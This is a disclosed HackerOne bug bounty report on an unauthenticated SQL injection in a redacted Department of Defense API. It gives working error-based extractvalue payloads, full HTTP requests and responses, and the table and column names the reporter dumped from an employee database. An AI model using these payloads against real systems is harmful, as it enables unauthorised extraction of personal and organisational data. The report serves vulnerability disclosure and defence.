---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2022-10-14
submitted: 2022-07-05T14:03:32.420Z
bounty_usd: null
votes: 61
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "0xd0ff9"
source: "https://hackerone.com/reports/1626226"
title: "Unauthenticated SQL Injection at █████████  [HtUS]"
---
# Unauthenticated SQL Injection at █████████  [HtUS]

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 61 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-10-14

- Report: [https://hackerone.com/reports/1626226](https://hackerone.com/reports/1626226)
- CWE: SQL Injection
- Submitted: 2022-07-05T14:03:32.420Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary
Hi team, I found Unauthenticated SQL Injection at ██████. Because of non-filter and non-escape input at API /api/organizations/*, attacker can inject malicious payload after single quote (') to exploit and extract database.

## Step to Reproduce:

Execute Request
```
GET /api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers



```


Then the response is 

```
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 209
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
X-DNS-Prefetch-Control: off
Expect-CT: max-age=0
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Content-Type-Options: nosniff
Origin-Agent-Cluster: ?1
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
X-XSS-Protection: 0
Strict-Transport-Security: max-age=31536000
Expires: Tue, 05 Jul 2022 04:12:11 GMT
Cache-Control: max-age=0, no-cache, no-store
Pragma: no-cache
Date: Tue, 05 Jul 2022 04:12:11 GMT
Connection: keep-alive

{"statusCode":500,"code":"P2010","error":"Internal Server Error","message":"\nInvalid `prisma.queryRaw()` invocation:\n\n\n  Raw query failed. Code: `1105`. Message: `XPATH syntax error: ':█████████'`"}
```


The result was leaked by SQL XPATH Error, so we get user() = ████████

Change query to version() we get version = 8.0.23
https://██████/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+version()))))=1--%20aa

Change query to version() we get database = ███
https://███/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+database()))))=1--%20aa

█████████
██████████
███
To extract data, we use this requests
```
GET /api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from%20information_schema.tables%20limit%2054,1))))=' HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers


```

█████

## Impact

Attacker can extract database from server █████

## Timeline

- **Report Filed**
- **2022-07-05** @0xd0ff9: The IP Vulnerable is: ███
If you have error "Unknown host: █████", you can put the IP in Target:
███
- **2022-07-05** @0xd0ff9: This is table name I dumped in '██████████' database
'task_header'
'employee_formal_training'
'itr_prod'
'itr_task'
'itr_task_group'
'journal_entry'
'mtl_prod'
'itr_task_header'
'mtl_task'
'organization_level'
'organization'
'mtl'
'afsc'
'mtl_task_header'
'person'
'product'
'task'
'role'
'rank'
'task_group'
'task_header'
'task_group_prod'
'task_group_task'
'base'
'task_group_task_header'
'employee_role'
'itr'
'employee_employee_role'
'_prisma_migrations'
'employee'
'employee_org'


## And Column Name of 'employee'
'employee_parent_unit'
'employee_primary_career_field_id'
'employee_tertiary_career_field_i'
'employee_training_status_code'
'employee_diert'
'employee_det'
'employee_person_id'
'employee_das'
'lastupdte_NM'
'createddte'
'lastupdte'
'createdNM'
'employee_rank_id'
'employee_parent_unit'
'employee_edipi'
'employee_secondary_career_field_'
'employee_assigned_unit'
'employee_email'
'employee_duty_career_field_id'
'employee_control_career_field_id'
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **2022-09-27** @ag3nt-j1: We usually do disclosure requests on Friday. We've been busy but will get this done this Friday or next Friday for sure.
- **2022-10-07** @0xd0ff9: Thanks, please help me do the redactions before publish.
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
